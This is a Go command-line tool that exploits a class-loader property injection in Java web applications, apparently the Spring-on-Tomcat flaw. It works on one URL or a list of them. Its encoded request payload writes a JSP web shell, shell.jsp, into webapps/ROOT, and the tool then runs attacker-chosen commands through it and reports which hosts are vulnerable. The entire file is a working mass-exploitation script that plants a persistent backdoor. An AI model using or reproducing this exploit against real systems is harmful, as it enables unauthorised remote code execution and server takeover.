package main

import (
	"bufio"
	"errors"
	"flag"
	"io/ioutil"
	"net/http"
	url2 "net/url"
	"os"
	"strings"
)

func main() {

	var host string
	var cmd string
	var results []string
	flag.StringVar(&host, "host", "http://127.0.0.1:80/", "待检测地址或者存放文件路径")
	flag.StringVar(&cmd, "cmd", "ls", "执行命令")

	flag.Parse()

	//check(host,cmd)
	file, err := os.Open(host)
	if err != nil {
		res := check(host, cmd)
		if res != "" {
			results = append(results, res)
		}
	} else {
		fs := bufio.NewScanner(file)
		for fs.Scan() {
			res := check(fs.Text(), cmd)
			if res != "" {
				results = append(results, res)
			}
		}
	}
	println("vulnerable host:")
	for _, v := range results {
		println(v)
	}

}
func check(url string, cmd string) string {
	var err error

	err = putjsp(url)
	if err != nil {
		return ""
	}
	return getcmd(url, cmd)
}

func putjsp(url string) error {
	u, e := url2.ParseRequestURI(url + "?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=")
	//println(u.String())
	if e != nil {
		//println(e.Error())
		return e
	}
	cli := http.Client{}
	req := &http.Request{
		Method: "GET",
		URL:    u,
	}
	h := http.Header{}
	h.Add("suffix", "%>//")
	h.Add("c", "Runtime")
	h.Add("prefix", "<%")
	req.Header = h
	resp, err := cli.Do(req)
	if err != nil {
		//println(err.Error())
		return err
	}
	if resp.StatusCode != 200 {
		//println(resp.StatusCode)
		return errors.New("wrong")
	}
	//println("ggg")
	return err
}

func getcmd(url string, cmd string) string {
	urls := strings.Split(url, "/")
	u := urls[0] + "//" + urls[2]
	resp, err := http.Get(u + "/shell.jsp?cmd=" + cmd)
	if err != nil {
		//println(err.Error())
		return ""
	}

	_, err = ioutil.ReadAll(resp.Body)

	if err != nil {
		return ""
	}
	//println("get:",resp.Status)
	//println("get:",string(b))
	if resp.StatusCode == 404 {
		return ""
	}
	return url
}
